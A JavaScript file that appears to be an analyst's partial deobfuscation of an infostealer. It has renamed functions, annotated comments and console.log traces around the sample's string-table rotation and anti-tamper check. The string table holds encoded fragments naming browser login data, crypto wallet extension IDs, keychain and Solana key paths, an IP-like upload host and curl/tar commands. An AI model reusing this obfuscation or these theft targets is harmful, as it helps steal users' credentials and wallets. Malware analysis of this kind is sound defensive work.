function get_string_table() {
    const look_up_array = ['are/B', 'le\\x20', 'i.npo', '\\x22\\x20\\x22', 'iQhFO', 'eaaah', 're.Op', 'wxoGA', 'llet', 'opera', 'leeob', 'FbzpY', 'ins/l', 'lipeo', 'mdjon', 'Edge/', 'aeach', 'son', 'ItYXP', 'solan', 'udeXZ', 'trace', 'deekn', '\\x20(tru', 'ogin.', 'soft/', 'eRead', 'hmclh', 'bbbnh', '/Libr', 'hostn', 'googl', '/pdow', 'cfgod', 'homed', 'proto', 'sSync', 'fcKeB', 'bohpj', 'nphpl', 'ructo', 'gkfmg', 'g/Moz', 'setIn', 'dirna', 'VQTGz', 'ng/Op', 'nctio', 'raveS', 'lengt', 'era\\x20S', '\\x5c+\\x5c+\\x20', 'onriS', 'warn', 'pikoo', 'omaab', 'get', 'WPVZX', 'pkjle', 'bfnae', '//45.', 'XJaBR', 'fig/E', 'ary/A', 'fldfp', '_file', 'fdial', 'ess', 'vctWO', 'ary/K', 'kodbe', 'lgmpc', '/AppD', 'filen', 'on.ex', 'lkFQG', 'logkc', 'is\\x22)(', 'Ssvvm', 'pglpn', '\\x22retu', '\\x5cp.zi', 'oamin', 'pplic', '1326735xIdcrA', '-Lo\\x20\\x22', '_proc', 'jkbgi', 'eycha', 'https', 'baa4d', 'fGOot', 'toStr', 'clnha', '\\x20Supp', '__pro', 'ewwnT', 'zA-Z_', 'nhcel', 'ddjkj', 'nstru', 'tSZOH', 'oiodb', 'nkbih', 'formD', '\\x5cp2.z', 'jmnoo', 'com.o', 'ibnej', 'Brave', 're/Br', 'bgeol', 'adlkm', 'lmeee', '/.sys', 'e)\\x20{}', 'e97d0', 'djkbp', 'eSync', 'ZVfJZ', 'lncbf', 'kkhmi', '\\x20-C\\x20', 'kpkcb', 'eciiL', 'WAOVh', 'GmKeT', 'Strea', '1122wnSEGz', 'oogle', 'jSAxS', 'path', 'ync', '0-9a-', 'tsmXM', 'e\\x22\\x20\\x22', '/Loca', 'qlQEz', 'ame', 'actio', 'init', 'idclj', 'ort/G', 'emcci', 'ilkdb', 'gjnck', 'ads', 'illa/', 'ajnim', 'terva', 'gger', '/Goog', '/uplo', 'wKKMJ', 'pgoak', 'xf\\x20', 'ldhgm', 'pjiig', 'aeaoe', 'tar\\x20-', '/Logi', 'lbocc', 'mcohi', 'gmccd', 'copyF', '-db', 'idb', 'iolgc', 'post', 'iNueL', 'whfGX', 'bapad', 'jpbpf', 'us.wa', 'txt', 'rn\\x20th', 'eebol', 'test', '/clie', 'info\\x22', 'hlefn', 'Profi', 'qikls', 'hid', '/User', 'knmef', 'ware/', 'fhboh', 'ipDxN', 'while', 'ata/R', 'nYEmi', 'rave-', 'a_id.', 'StSNC', 're/Op', 'amhMj', 'bbldc', 'Data', 'table', 'join', 'fig/s', 'dgmol', '.file', 'befbm', 'cooki', 'wkjbr', '20sZyQaF', 'size', 'l\\x20Ext', 'fejja', 'ation', '://ap', '2.14:', 'lchlg', 'ccfch', '/id.j', 'pdfla', 'int.i', 'dgcce', 'UMAfv', 'ensio', 'Brows', 'olcbk', 'hecda', 'inclu', 'idlcd', '{}.co', 'sWOxD', 'pld_', 'Roami', 'rmSyn', 'des', 'dlcob', 'child', 'xuJyt', 'n\\x20Set', 'ion', 'omihk', 'dus/e', 'bind', 'CLHtX', 'MGPhx', 'eSoft', 'rQURz', 'ggaki', 'oohck', 'renam', 'ing', 'strin', 'fbeog', 'hfood', 'wgIPI', 'KpAJV', 'QwGEe', 'n3\\x20\\x22', '2063411tuPmOR', 'SOYuH', 'Z_$][', 'jblnd', 'tmpdi', 'gWNrp', 'ox/Pr', '1764205LkKvhV', 'write', 'penjl', 'kziTx', 'VKblL', 'fgpgk', 'n()\\x20', 'PllXx', '69067', 'a-zA-', 'deajf', 'BWNfJ', '/Chro', 'count', 'ave-B', 'mibbk', '_lst', 'ZaSwG', 'ata/L', 'QdniH', 'oficd', 'WoIXf', 'debu', 'OPscc', 'yPKzl', 'curl\\x20', 'agoak', 'IMplH', 'xodus', 'User\\x20', 'hifaf', 'conso', 'isDir', 'exec', '/Brav', 'KHUgC', 'afbcb', 'oihof', 'jdnno', 'chain', 'bakop', 'creat', 'krLFo', 'kpcnl', 'Micro', 'apply', 'ort/', 'ort/B', 'gipfn', 'pekpl', 'http:', 'acces', 'ser', 'readd', 'ile', 'xtens', 'cionb', 'olDmw', 'NUUae', 'ezour', 'getTi', '1224', 'pndod', 'LJEoB', 'omGLV', 'ctor(', '12oQzxMz', '1892uzNGZn', ')+)+)', 'fig/', 'age/d', '658792VYuVaM', 'ejbal', 'ngplf', 'FileS', 'ocal/', 'Softw', 'jnkhf', 'EALgZ', 'bepdk', 'orm', '3TYzzyN', '50822tLwold', 'log', '.wall', 'info', 'input', 'ngcna', 'Awqgg', 'gdoal', 'acmac', 'ion\\x20*', 'uts', 'ahbmg', '\\x5c(\\x20*\\x5c', '_uld', 'keeod', '$]*)', 'RQpOG', 'TzmZO', '\\x20Data', 'mRAmD', 'olana', 'pytho', '/stor', 'yKpDE', 'aholp', 'onoee', 'era', 'error', 'cUtpY', 'g/Exo', 'n\\x20(fu', 'khtOJ', 'gpafn', '-rele', 'searc', 'l\\x20Sta', 'dfjmm', 'ort/e', 'bohma', 'forEa', 'ome', 'MXJeH', 'irSyn', 'to__', 'mgjnj', 'round', '(((.+', 'GYLKp', '/exod', 'imhlp', 'NNlkZ', 'ophhp', 'moz-e', '/.con', 'imael', 'bomem', 'ppbcl', 'kkolj', 'Local', 'YsVvb', 'repla', 'pebkl', 'iijed', 'retur', 'nt/', 'ata/', 'HILJU', 'FmfeP', 'zSWNC', 'call', 'Firef', 'mamcf', 'jbmgj', 'Defau', 'peras', 'ain', 'hdmPI', 'JiykN', 'hhjch', 'rome', 'parse', 'odkjb', 'const', 'oftwa', 'XVktu', 'omjjk', 'ThWSi', 'rpWtD', 'cgndf', 'ase', 'tion', 'tings', 'bhhhl', 'jgjfh', '/ld_', 'efaul', '128.5', '*(?:[', 'ponpf', 'le/Ch', 'gpnkl', 'ector', 'exist', 'ciHPe', 'apagc', 'rowse', 'o/e97', 'push', 'excep', 'url', '\\x5cpyth', 'e/Chr', 'reque', 'ata', '3373469nFtQgi', 'mnkoe', 'state', 'type', 'VrfPO', 'n\\x20Dat', 'behhm', 'lmome', 'e-chr', 'srDvQ', '\\x5c.pyp', 'FKqWl', 'Objec', 'MAsWb', 'keych', '-Brow', 'phepc', 'brld_', 'platf', 'ofile', 'statS', 'multi', 'Googl', 'funct'];
    // Redefine the function to directly return the array
    get_string_table = function() {
        return look_up_array;
    };
    console.log("[get_string_table()] Initializing string_array")
    return get_string_table();
}

function Map_Index_To_String(index, _unused_param) {
    
    const string_table = get_string_table();
    // redefinition of the function for obfusc. Not really any sense.
    return Map_Index_To_String = function(index_inner, _unused_param) {
        // calculates the index for the string table with a offset substraction : index_inner = index_inner - 374
        index_inner = index_inner - (0x20a1 * -0x1 + -0xb39 + 0x2d50); // offset is 374 in dec
        let _0x155c34 = string_table[index_inner];
        return _0x155c34;
    }, Map_Index_To_String(index, _unused_param);
}

function sort_string_list(get_string_table, _0x45c4dd) {
    // all those methods returns string from a string table using a bit of offset substraction and useless params
    function get_a_string_from_string_table_1(unused_param, unused_param, index, unused_param, unused_param) {
        // index - 949
        return Map_Index_To_String(index - '0x2a4', unused_param);
    }
        // index + 632
    function get_a_string_from_string_table_2(unused_param, unused_param, index, unused_param, unused_param) {
        return Map_Index_To_String(index - -'0x278', unused_param);
    }
        // index + 622
    function get_a_string_from_string_table_3(unused_param, index, unused_param, unused_param, unused_param) {
        return Map_Index_To_String(index - -0x26e, unused_param);
    }
        // index - 949
    function get_a_string_from_string_table_4(unused_param, unused_param, unused_param, index, unused_param) {
        return Map_Index_To_String(index - '0x3b5', unused_param);
    }
        //index + 949
    function get_a_string_from_string_table_5(index, unused_param, unused_param, unused_param, unused_param) {
        return Map_Index_To_String(index - -'0x3b5', unused_param);
    }
    // wtf is this shit - nvm this initializes the string table i think
    console.log("[Method 1] Loading String_Array")
    const string_table = get_string_table();

    // infinity loop? - I think this is used to resort the string array 
    console.log("[Method 1] Starting to sort the string_array")
    while (!![]) {
        try {
          
            // first iteration
            const magic_number = 
            //returns String: "Brows" -- offset is: 1 -> NaN
            -parseInt(get_a_string_from_string_table_4('0x6e7', '0x58f', '0x6d0', 0x609, 0x661)) / (0xe01 + -0x3 * 0xad9 + 0x128b) *
            // returns string: "olcbk" -- offset is: 2 -> NaN
            (parseInt(get_a_string_from_string_table_4(0x67f, 0x613, 0x6a6, '0x60a', '0x6c4')) / (-0x166 * 0x11 + 0xa * 0xbb + 0x107a)) + 
            // returns string: "re.Op" -- offset is: 3 -> NaN
            -parseInt(get_a_string_from_string_table_4('0x4e1', 0x4b6, 0x5da, 0x531, '0x534')) / (0x2566 + 0xf16 * -0x1 + -0x164d) * 
            // returns string: "size" -- offset is: 4 -> NaN
            (-parseInt(get_a_string_from_string_table_1('0x497', '0x56a', 0x4ea, '0x4b7', 0x4c4)) / (0xd51 + 0x1 * -0x12e + -0x6b * 0x1d)) + 
            // returns string: "idclj" -- offset is: 5 -> NaN
            parseInt(get_a_string_from_string_table_4(0x65e, 0x600, 0x4d7, '0x5b8', '0x64d')) / (0x1da1 + 0x21b2 * -0x1 + -0x1 * -0x416) * 
            // returns string: "20sZyQaF" -- offset is: 6 -> -14
            (-parseInt(get_a_string_from_string_table_4('0x6ba', '0x56c', 0x589, 0x5fa, '0x6a6')) / (-0x1843 + 0xcb3 * -0x2 + 0x31af)) + 
            // returns string: "tsmXM" -- offset is: 7 -> NaN
            parseInt(get_a_string_from_string_table_4(0x5a3, 0x5f6, 0x59a, '0x5b1', 0x5cd)) / (0x5 * 0x57 + 0x805 + -0x9b1) + 
            // returns string: "://ap" -- offset is: 8 -> NaN
            -parseInt(get_a_string_from_string_table_3(-0xed, -'0x24', '0x85', 0x91, -'0xf0')) / (-0x285 + -0x2b1 * 0x7 + 0x94 * 0x25) + 
            // returns string: "gpnkl" -- offset is: 9 -> NaN
            parseInt(get_a_string_from_string_table_2('0x114', '0x65', 0xbb, '0xcd', '0x1f')) / (-0x367 + -0x1f0b + 0x1 * 0x227b) + 
            // returns string: "-Lo\x20\x22" -- offset is: 10 -> NaN
            parseInt(get_a_string_from_string_table_5(-0x1ea, -'0x298', -'0x1ed', -0x2ca, -0x117)) / (0x2 * 0x65e + -0x1c9e + -0x3fb * -0x4) * 
            // returns string: "FileS" -- offset is: 11 -> NaN
            (parseInt(get_a_string_from_string_table_4('0x629', '0x72e', 0x64a, '0x67c', 0x5e9)) / (0x59a + -0xb24 * 0x2 + 0x10b9));
            
            // if (magic_number === 368184) break;
            if (magic_number === _0x45c4dd) {
                console.log("[Method 1] Finished sorting the string_array")
                break;
              
            }
            // removes first element from array and puts it on the end
            else string_table['push'](string_table['shift']());
        
        // No idea what this variable is. It is only found here once in the whole file
        } catch (_0x2a42fa) {
            // removes first element from array and puts it on the end
            string_table['push'](string_table['shift']());
        }
    }

}
console.log("[Main Flow] Strating Method1")
sort_string_list(get_string_table, -0x1452a + -0x7ee11 + -0xed173 * -0x1)
console.log("[Main Flow] Finished Method2")



const _0x2c3f3c = (function() {
    let _0x2eb01d = !![];
    return function(_0x4f52ae, _0x82e16d) {
        const _0x1f8d36 = _0x2eb01d ? function() {
            function _0x3132e4(_0x9cf585, _0x41a378, _0x13a5ad, _0x4a85c6, _0x113a83) {
                return Map_Index_To_String(_0x9cf585 - -'0x37a', _0x41a378);
            }

            function _0x344fa8(_0x50fa40, _0x5aa480, _0x11d85a, _0x2f10a2, _0x176877) {
                return Map_Index_To_String(_0x176877 - '0x32c', _0x2f10a2);
            }

            function _0x5b49ad(_0x5de36b, _0x1bbd83, _0x12ac82, _0x1552fc, _0xd655ca) {
                return Map_Index_To_String(_0x5de36b - 0xff, _0x1bbd83);
            }

            function _0x33705a(_0x4bead7, _0xf7137d, _0x16c7a2, _0x1c11eb, _0x3fa10f) {
                return Map_Index_To_String(_0x1c11eb - -0x24c, _0x4bead7);
            }

            function _0x14640a(_0xaa5709, _0x51fa17, _0x266ff6, _0x4a91db, _0x4409e5) {
                return Map_Index_To_String(_0x51fa17 - -0x396, _0xaa5709);
            }
            if (_0x82e16d) {
                if (_0x14640a(-0x121, -0x6c, -'0x4a', -0x2f, '0x1e') === _0x344fa8('0x416', 0x526, '0x4cb', '0x557', 0x4a5)) {
                    if (_0x45b246) return _0x8202cf[_0x5b49ad('0x2e2', 0x26a, '0x2e5', '0x24a', 0x2b8) + 'c'](_0x1af355), void(_0x1b93eb = -0x7ad + 0x1c * 0x15 + -0x99 * -0x9);
                    _0x2c2034[_0x5b49ad('0x2e2', '0x21d', '0x33d', 0x27d, '0x2c0') + 'c'](_0x31fdf9), _0x3d3482();
                } else {
                    const _0x4ae166 = _0x82e16d[_0x5b49ad('0x32f', '0x27c', '0x275', 0x39b, 0x26d)](_0x4f52ae, arguments);
                    return _0x82e16d = null, _0x4ae166;
                }
            }
        } : function() {};
        return _0x2eb01d = ![], _0x1f8d36;
    };
}()),
_0x1267e5 = _0x2c3f3c(this, function() {
    function _0x14c0a2(_0x43b7f5, _0x17ae72, _0xa29221, _0x21c8db, _0x4decab) {
        a = Map_Index_To_String(_0x21c8db - 0x248, _0x17ae72);
        console.log("[Method 2] String retrieved from strin_array: " + a)
        return a
    }

    function _0x39e27d(_0x7188ae, _0x252aa7, _0x22513e, _0x3fd17d, _0x489ea1) {
         
        a = Map_Index_To_String(_0x3fd17d - 0x18d, _0x252aa7);
        console.log("[Method 2] String retrieved from strin_array: " + a)
        return a 
    }

    function _0x189548(_0x5cb022, _0x14798c, _0x327304, _0x4a8776, _0x1a8ffc) {
        a = Map_Index_To_String(_0x327304 - -0x30f, _0x14798c);
        console.log("[Method 2] String retrieved from strin_array: " + a)
        return a 
    }

    function _0x1c55ca(_0x2906e4, _0xeef17e, _0x285287, _0x354541, _0x180eb7) {
        a = Map_Index_To_String(_0x180eb7 - '0x2e6', _0x354541);
        console.log("[Method 2] String retrieved from strin_array: " + a)
        return a
    }

    function _0x39ab8d(_0x523336, _0x402b9b, _0x2f8ecd, _0x4657c9, _0x3ec436) {
        a = Map_Index_To_String(_0x3ec436 - -0x10b, _0x2f8ecd);
        console.log("[Method 2] String retrieved from strin_array: " + a)
        return a
    }
    console.log("[Method 2] Starting the keyfunction 'a' ")
    a = _0x1267e5[_0x39ab8d('0x229', '0x223', 0x2c2, '0x219', '0x230') + _0x14c0a2(0x516, 0x412, '0x34c', '0x43c', 0x4e3)]()[_0x1c55ca('0x570', '0x5f7', '0x59e', 0x612, 0x55d) + 'h'](_0x39ab8d('0x9a', 0x221, 0x211, '0x191', '0x178') + _0x189548('0x28', -'0x86', -'0xc8', -'0x133', -0x14d) + '+$')[_0x14c0a2(0x5fc, '0x66b', '0x641', '0x583', '0x512') + _0x39e27d(0x2d6, '0x442', '0x2b8', '0x381', 0x31e)]()[_0x39e27d(0x42c, 0x3c5, 0x4b4, '0x434', 0x48f) + _0x39ab8d(0x2b2, 0x1c3, '0x22e', 0x1f5, '0x1fc') + 'r'](_0x1267e5)[_0x1c55ca('0x56c', 0x56b, '0x4a1', 0x502, '0x55d') + 'h'](_0x14c0a2('0x56b', '0x594', 0x4aa, '0x4cb', 0x430) + _0x1c55ca(0x59c, '0x58e', '0x442', '0x4ea', 0x52d) + '+$');
    
    // methoden_name = _0x39ab8d('0x229', '0x223', 0x2c2, '0x219', '0x230') + _0x14c0a2(0x516, 0x412, '0x34c', '0x43c', 0x4e3)
    // res = _0x1267e5[methoden_name]() // _0x3132e4.toString()
    // res_param = _0x39ab8d('0x9a', 0x221, 0x211, '0x191', '0x178') + _0x189548('0x28', -'0x86', -'0xc8', -'0x133', -0x14d) + '+$'
    // res_index = _0x1c55ca('0x570', '0x5f7', '0x59e', 0x612, 0x55d) + 'h' //search
    
    // methoden_name_zwei = _0x14c0a2(0x5fc, '0x66b', '0x641', '0x583', '0x512') + _0x39e27d(0x2d6, '0x442', '0x2b8', '0x381', 0x31e)
    // res_zwei_index = _0x39e27d(0x42c, 0x3c5, 0x4b4, '0x434', 0x48f) + _0x39ab8d(0x2b2, 0x1c3, '0x22e', 0x1f5, '0x1fc') + 'r'
    
    // res_drei = res[res_index](res_param)[methoden_name_zwei]()[res_zwei_index](_0x1267e5)
    
    // res_drei_param = _0x14c0a2('0x56b', '0x594', 0x4aa, '0x4cb', 0x430) + _0x1c55ca(0x59c, '0x58e', '0x442', '0x4ea', 0x52d) + '+$'
    // res_drei_index = _0x1c55ca('0x56c', 0x56b, '0x4a1', 0x502, '0x55d') + 'h'
    // res_drei[res_drei_index](res_drei_param);
    
    console.log("[Method 2] Keyfunction 'a' is finished returning output: " + a)
    return a
});

console.log("[Main Flow] Starting Method2")
// _0x1267e5();
console.log("[Main Flow] Finished Method2")
//

// console.log(b)

console.log(_0x2c3f3c().toString())